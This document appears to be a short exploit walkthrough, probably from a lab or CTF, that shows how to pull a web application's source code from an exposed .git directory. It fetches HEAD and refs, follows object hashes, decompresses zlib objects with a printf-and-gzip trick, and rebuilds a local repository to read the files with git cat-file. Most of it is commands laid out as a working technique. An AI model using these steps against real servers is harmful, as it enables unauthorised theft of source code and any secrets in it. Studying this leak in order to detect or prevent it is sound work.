# Git Information Leak

### Exploit

* we see that `/.git` is forbidden that means we don't have direct access to it.

* First, we can recover some files:

  - `.git/config`.
  - `.git/HEAD`.

* From `.git/HEAD`, we can see that the `HEAD` is at `refs/heads/master`

  We can therefore access this file: `.git/refs/heads/master`

  From that file, we get a hash: `19e7bfab0ad2b25fa01419a18d53fd42ae0b5113`

* This will link us to another file: `.git/objects/19/e7bfab0ad2b25fa01419a18d53fd42ae0b5113` 

  **(by using the first two bytes as a directory's name and the rest as the file's name)**

* As the file is compressed using **zlib** . but we can decompress it using gzip by following command :

  ```bash
  printf "\x1f\x8b\x08\x00\x00\x00\x00\x00" |cat - e7bfab0ad2b25fa01419a18d53fd42ae0b5113 |gzip  -cd -q | strings -a
  ```

* from here we get:

  `commit 199tree 58ace0476093d04023f84d7816adacfa7b879c43`

  it is link to another commit we can access it at following url:

  `.git/objects/58/ace0476093d04023f84d7816adacfa7b879c43`

  after decompressing we get:

  ```
  tree 182
  40000 css
  100644 favicon.ico
  s100644 footer.php
  3100644 header.php
  100644 index.php
  ```

  **Unfortunately, using `strings` does not give us the hash for each file. We can do is create our own local repo with the same git structure:**

* ```bash
  $ mkdir /tmp/hack
  $ cd /tmp/hack
  $ git init 
  ```

  And copy our files in it:

  ```bash
  $ mkdir -p .git/objects/58 .git/objects/19
  $ cp /tmp/e7bfab0ad2b25fa01419a18d53fd42ae0b5113 /tmp/hack/.git/objects/19/
  $ cp /tmp/ace0476093d04023f84d7816adacfa7b879c43 /tmp/hack/.git/objects/58/
  ```

* Then we should be able to retrieve the list of hashes:

  ```bash
  $ git cat-file -p 58ace0476093d04023f84d7816adacfa7b879c43
  ```


* Once you're there, you can keep downloading the files and copying them in the right spot to get access to the full code using `git cat-file -p ...`. 